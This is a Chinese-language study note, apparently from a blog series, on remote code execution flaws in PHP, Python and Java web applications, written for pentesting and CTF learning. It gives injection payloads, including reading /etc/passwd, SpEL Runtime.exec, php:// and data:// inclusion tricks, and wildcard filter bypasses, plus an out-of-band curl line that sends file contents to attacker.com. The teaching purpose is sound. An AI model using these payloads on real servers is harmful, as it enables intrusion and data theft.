#  第73天-WEB攻防学习笔记：RCE（远程代码执行）漏洞深度解析  
原创 萧瑶
                    萧瑶  AlphaNet   2026-03-08 02:41  
  
在Web安全领域中，**RCE（Remote Code Execution，远程代码执行）**是一类极具破坏力的漏洞。一旦攻击者成功利用RCE漏洞，就可以在目标服务器上执行任意代码或系统命令，从而进一步获取服务器权限、读取敏感数据，甚至控制整个系统。  
  
  
从本质上来说，RCE漏洞的核心问题只有一句话：  
  
  
**用户输入的数据被服务器当作代码或系统命令执行。**  
  
  
在实际的渗透测试与CTF比赛中，RCE漏洞往往是攻击链中的关键一环。  
  
  
# 一、RCE漏洞基本分类  
  
  
RCE通常可以分为两种主要类型：  
  
## 1 代码执行（Code Execution）  
  
  
代码执行漏洞指的是：**程序将用户输入当作脚本代码进行解析并执行。**  
  
  
例如：  
  
```
eval($_GET['cmd']);

```  
  
  
攻击者访问：  
  
```
?cmd=phpinfo();

```  
  
  
服务器就会执行 phpinfo() 函数。  
  
### 本质执行流程  
  
```
用户输入 → 代码解析 → 执行

```  
  
### 常见功能点  
  
  
现实开发中，以下场景容易出现代码执行风险：  
  
- 在线编程平台  
- 在线代码运行环境  
- 模板解析系统  
- 动态表达式解析  
这些功能本身需要执行代码，但如果缺乏安全控制，就可能被攻击者利用。  
  
  
## 2 命令执行（Command Execution）  
  
  
命令执行漏洞指的是：  
  
  
**程序调用操作系统命令，并将用户输入拼接到命令中执行。**  
  
  
例如：  
  
```
system("ping ".$_GET['ip']);

```  
  
  
攻击者输入：  
  
```
?ip=127.0.0.1 && cat /etc/passwd

```  
  
  
服务器执行的实际命令变成：  
  
```
ping 127.0.0.1 && cat /etc/passwd

```  
  
### 本质执行流程  
  
```
用户输入 → 拼接系统命令 → 操作系统执行

```  
  
### 常见功能点  
  
  
命令执行漏洞经常出现在：  
  
- 服务器管理面板  
- 网络诊断工具  
- 运维自动化系统  
- 系统监控工具  
例如：  
  
```
ping
traceroute
nslookup

```  
  
  
如果这些功能直接拼接用户输入，就容易产生RCE漏洞。  
  
  
# 二、常见RCE危险函数  
  
  
不同编程语言都有可能触发RCE漏洞。  
  
  
# 1 PHP  
  
  
PHP由于动态特性强，是RCE漏洞最常见的语言之一。  
  
## PHP代码执行函数  
  
  
以下函数可以将字符串当作代码执行：  
  
```
eval()
assert()
preg_replace()
create_function()
array_map()
call_user_func()
call_user_func_array()
array_filter()
uasort()

```  
  
  
示例：  
  
```
eval($_POST['cmd']);

```  
  
  
攻击者输入：  
  
```
cmd=system('whoami');

```  
  
  
服务器就会执行系统命令。  
  
  
## PHP命令执行函数  
  
  
这些函数直接调用操作系统：  
  
```
system()
exec()
shell_exec()
passthru()
pcntl_exec()
popen()
proc_open()

```  
  
  
例如：  
  
```
system($_GET['cmd']);

```  
  
  
攻击者输入：  
  
```
?cmd=cat flag.php

```  
  
  
服务器就会读取文件。  
  
  
# 2 Python  
  
  
Python同样存在代码执行风险。  
  
  
常见危险函数包括：  
  
```
eval
exec
subprocess
os.system
commands

```  
  
  
例如：  
  
```
eval(input())

```  
  
  
攻击者输入：  
  
```
__import__('os').system('id')

```  
  
  
系统命令就会执行。  
  
  
# 3 Java  
  
  
Java语言本身没有像PHP eval() 那样直接执行字符串代码的函数。  
  
  
但Java拥有**反射机制**和**表达式引擎**，仍然可能触发RCE。  
  
  
常见表达式引擎：  
  
```
OGNL
SpEL
MVEL

```  
  
  
例如 **SpEL表达式执行**：  
  
```
T(java.lang.Runtime).getRuntime().exec('calc')

```  
  
  
如果程序解析用户输入作为表达式，就可能触发代码执行。  
  
  
典型案例包括：  
  
- Spring Expression Language（SpEL）  
- Struts2 OGNL注入  
- 模板引擎表达式注入  
# 三、RCE常见功能点  
  
  
在渗透测试过程中，可以重点关注以下功能模块：  
  
### 1 在线代码运行平台  
  
  
例如：  
  
- 在线编程环境  
- 在线代码测试平台  
- CTF在线运行环境  
如果执行环境没有隔离，就可能执行系统命令。  
  
  
### 2 系统管理面板  
  
  
例如：  
  
- 服务器管理后台  
- 运维控制面板  
- 网络检测工具  
这些系统通常需要执行：  
  
```
ping
traceroute
nslookup

```  
  
  
如果参数拼接不安全，就会导致命令执行漏洞。  
  
  
### 3 表达式解析系统  
  
  
例如：  
  
- 评论解析系统  
- 模板引擎  
- 规则引擎  
示例：  
  
```
comment=T(java.lang.Runtime).getRuntime().exec('calc')

```  
  
  
如果表达式来自用户输入，就可能触发RCE。  
  
  
# 四、RCE漏洞引发链  
  
  
在真实攻击中，RCE往往是漏洞链中的最终阶段。  
  
  
常见漏洞链包括：  
  
### SQL注入 → 写入WebShell → RCE  
  
### 文件上传 → 上传脚本 → 代码执行  
  
### 文件包含 → 加载恶意文件 → RCE  
  
### 反序列化 → 调用危险函数 → 命令执行  
  
  
因此在漏洞挖掘中，需要具备**攻击链思维**。  
  
  
# 五、RCE回显问题  
  
  
在利用RCE漏洞时，通常会遇到两种情况。  
  
  
## 1 有回显  
  
  
执行结果直接返回。  
  
  
例如：  
  
```
system('whoami');

```  
  
  
浏览器直接显示：  
  
```
www-data

```  
  
  
这种情况利用最简单。  
  
  
## 2 无回显  
  
  
服务器执行命令，但不会返回结果。  
  
  
这时可以使用以下方法。  
  
### 方法一 写入文件  
  
```
system('cat flag.php > test.txt');

```  
  
  
然后访问：  
  
```
/test.txt

```  
  
  
查看结果。  
  
  
### 方法二 外带数据（OOB）  
  
  
例如：  
  
```
curl http://attacker.com/?data=$(cat flag.php)

```  
  
  
服务器主动将数据发送到攻击者控制的服务器。  
  
  
# 六、CTF中常见RCE绕过技巧  
  
  
在CTF比赛中，RCE往往需要绕过过滤。  
  
  
## 1 通配符绕过  
  
  
示例：  
  
```
system('tac fla*.php');

```  
  
  
利用通配符读取 flag.php。  
  
  
## 2 通配符 + 管道符  
  
  
示例：  
  
```
cp fla*.ph* 2.txt
echo shell_exec('tac fla*.ph*');

```  
  
  
## 3 参数逃逸  
  
  
示例代码：  
  
```
eval($_GET[1]);

```  
  
  
利用：  
  
```
?1=system('tac flag.php');

```  
  
  
## 4 文件包含 + 伪协议  
  
  
示例：  
  
```
include $_GET[a];

```  
  
  
利用：  
  
```
data://text/plain,<?php system('tac fla*');?>

```  
  
  
### php://input 利用  
  
  
请求：  
  
```
?a=php://input

```  
  
  
POST内容：  
  
```
<?php system('tac flag.php');?>

```  
  
  
服务器会执行POST中的代码。  
  
  
# 七、黑盒RCE测试思路  
  
  
黑盒渗透测试中，可以重点关注以下位置：  
  
- 参数输入框  
- 文件解析  
- API接口  
- 模板解析  
- 系统工具模块  
常见测试Payload：  
  
```
;id
&&whoami
|cat /etc/passwd
$(id)
`id`

```  
  
  
# 八、总结  
  
  
RCE漏洞是Web安全中**危害等级最高的漏洞之一**。  
  
  
一旦成功利用，就意味着攻击者可以：  
  
- 执行任意命令  
- 读取服务器敏感文件  
- 控制服务器  
- 横向渗透内网  
从安全研究角度来看，理解RCE不仅仅是记住几个危险函数，更重要的是理解一条核心逻辑：  
  
```
用户输入 → 程序解析 → 执行路径 → 系统权限

```  
  
  
只要程序在某个环节**动态解析用户输入**，就可能产生远程代码执行风险。  
  
  
真正的安全研究者，会在任何“解析输入”的地方看到潜在的攻击面。  
  
